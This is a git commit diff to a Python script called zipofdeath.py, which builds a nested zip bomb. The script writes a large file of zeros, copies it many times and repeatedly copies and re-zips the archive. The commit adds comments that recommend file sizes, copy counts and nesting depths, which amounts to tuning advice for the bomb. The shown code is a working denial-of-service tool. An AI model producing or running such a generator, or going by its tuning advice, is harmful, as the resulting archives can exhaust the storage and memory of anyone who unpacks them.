c4b75d6ee079493d08b7d54b9eee24e65d8deffe
Ng Jen Shen <jenshen.ng001@gmail.com>
2026-09-01 15:46:17 +0800

    Adjust recommended limits for file operations
    Updated limits for file creation and duplication to recommended values.

--- zipofdeath.py
+++ zipofdeath.py
@@ -9,14 +9,14 @@ print("Writing file...")
 os.makedirs("bomb")
 
 with open("bomb/death1.txt", "w") as f:
-    f.write("0"*20000000)
+    f.write("0"*20000000)  #Recommended limit: less than 0.5 - 1 bil 
 
 ##==================
 ##Duplicate
 ##==================
 print("Duplicating files...")
 
-for i in range(2, 101):
+for i in range(2, 101):  #Recommended limit: less than 500
     shutil.copy("bomb/death1.txt", f"bomb/death{i}.txt")
 
 ##==================
@@ -31,14 +31,14 @@ shutil.rmtree("bomb")
 ##===================================
 print("Duplicating zips, zip them, and repeat...")
 
-for i in range(6):
+for i in range(6):   #Recommended limit: 6-7
     print("Round", i+1)
 
     os.makedirs("bomb")
     shutil.move("bomb.zip", "bomb")
 
     print("Duplicating...")
-    for j in range(2, 101):
+    for j in range(2, 101): #Recommended limit: less than 500
         shutil.copy("bomb/bomb.zip", f"bomb/bomb{j}.zip")
 
     print("Zipping...")
